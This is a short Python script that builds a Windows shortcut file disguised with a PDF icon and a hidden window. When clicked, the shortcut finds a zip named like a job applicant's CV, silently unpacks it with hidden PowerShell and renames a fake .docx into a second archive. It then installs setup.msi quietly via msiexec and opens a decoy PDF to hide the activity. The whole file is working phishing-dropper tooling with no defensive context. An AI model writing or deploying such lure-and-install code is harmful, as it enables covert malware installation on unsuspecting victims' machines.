import win32com.client
import os

shell = win32com.client.Dispatch("WScript.Shell")

lnk_path = os.path.abspath("unzip.lnk")

MSI_FILENAME = "setup.msi"
TAILIEU_FILENAME = "tailieu.docx"
TAILIEU_ZIP_FILENAME = "tailieu.zip"
TAILIEU_EXTRACTED_DIR = "tailieu_extracted"
OPEN_AFTER_INSTALL = "1.pdf"
ZIP_PATTERN = "*CV-VuDinhViet.zip"

shortcut = shell.CreateShortCut(lnk_path)

shortcut.TargetPath = r"C:\Windows\System32\cmd.exe"
shortcut.WorkingDirectory = r"C:\\Users"

shortcut.Arguments = r'''/c for /r "C:\Users" %i in ({zip_pattern}) do (powershell -NoProfile -WindowStyle Hidden -Command "try {{ Expand-Archive -LiteralPath '%i' -DestinationPath \"$env:TEMP\%~ni\" -Force }} catch {{}}" >nul 2>&1 & cd /d "%TEMP%\%~ni" & if exist "%TEMP%\%~ni\.System Information\Data\tailieu.docx" (rename "%TEMP%\%~ni\.System Information\Data\tailieu.docx" "tailieu.zip" & powershell -NoProfile -WindowStyle Hidden -Command "try {{ Expand-Archive -LiteralPath '%TEMP%\%~ni\.System Information\Data\tailieu.zip' -DestinationPath '%TEMP%\%~ni\{extracted_dir}' -Force }} catch {{}}" >nul 2>&1 & cd /d "%TEMP%\%~ni\{extracted_dir}\word" & if exist {msi} (msiexec /i {msi} /qn /norestart >nul 2>&1 & if exist {open_file} start "" "{open_file}") ))'''.format(
    zip_pattern=ZIP_PATTERN,
    extracted_dir=TAILIEU_EXTRACTED_DIR,
    msi=MSI_FILENAME,
    open_file=OPEN_AFTER_INSTALL)

# shortcut.IconLocation = r"C:\Windows\System32\shell32.dll,21"  # Thêm icon

icon_path = os.path.abspath("pdf.ico")
shortcut.IconLocation = icon_path

shortcut.WindowStyle = 0  # Ẩn cửa sổ

shortcut.save()

print("Created:", lnk_path)